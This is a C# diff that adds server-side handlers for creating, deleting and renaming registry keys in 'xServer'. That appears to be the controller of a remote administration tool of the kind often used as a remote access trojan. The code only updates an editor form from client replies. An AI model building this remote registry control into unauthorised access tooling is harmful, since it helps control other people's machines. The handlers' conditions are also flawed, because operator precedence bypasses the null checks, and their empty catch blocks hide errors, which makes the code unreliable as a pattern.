@@ -26,5 +26,65 @@ namespace xServer.Core.Commands
             catch
             { }
         }
+
+        public static void HandleCreateRegistryKey(xServer.Core.Packets.ClientPackets.GetCreateRegistryKeyResponse packet, Client client)
+        {
+            try
+            {
+                // Make sure that the client is in the correct state to handle the packet appropriately.
+                if (client != null && client.Value.FrmRe != null && !client.Value.FrmRe.IsDisposed || !client.Value.FrmRe.Disposing)
+                {
+                    if (!packet.IsError)
+                    {
+                        client.Value.FrmRe.AddKeyToTree(packet.ParentPath, packet.Match);
+                    }
+                    else
+                    {
+                        client.Value.FrmRe.ShowErrorMessage(packet.ErrorMsg);
+                    }
+                }
+            }
+            catch { }
+        }
+
+        public static void HandleDeleteRegistryKey(xServer.Core.Packets.ClientPackets.GetDeleteRegistryKeyResponse packet, Client client)
+        {
+            try
+            {
+                // Make sure that the client is in the correct state to handle the packet appropriately.
+                if (client != null && client.Value.FrmRe != null && !client.Value.FrmRe.IsDisposed || !client.Value.FrmRe.Disposing)
+                {
+                    if (!packet.IsError)
+                    {
+                        client.Value.FrmRe.RemoveKeyFromTree(packet.ParentPath, packet.KeyName);
+                    }
+                    else
+                    {
+                        client.Value.FrmRe.ShowErrorMessage(packet.ErrorMsg);
+                    }
+                }
+            }
+            catch { }
+        }
+
+        public static void HandleRenameRegistryKey(xServer.Core.Packets.ClientPackets.GetRenameRegistryKeyResponse packet, Client client)
+        {
+            try
+            {
+                // Make sure that the client is in the correct state to handle the packet appropriately.
+                if (client != null && client.Value.FrmRe != null && !client.Value.FrmRe.IsDisposed || !client.Value.FrmRe.Disposing)
+                {
+                    if (!packet.IsError)
+                    {
+                        client.Value.FrmRe.RenameKeyFromTree(packet.ParentPath, packet.OldKeyName, packet.NewKeyName);
+                    }
+                    else
+                    {
+                        client.Value.FrmRe.ShowErrorMessage(packet.ErrorMsg);
+                    }
+                }
+            }
+            catch { }
+        }
     }
 }
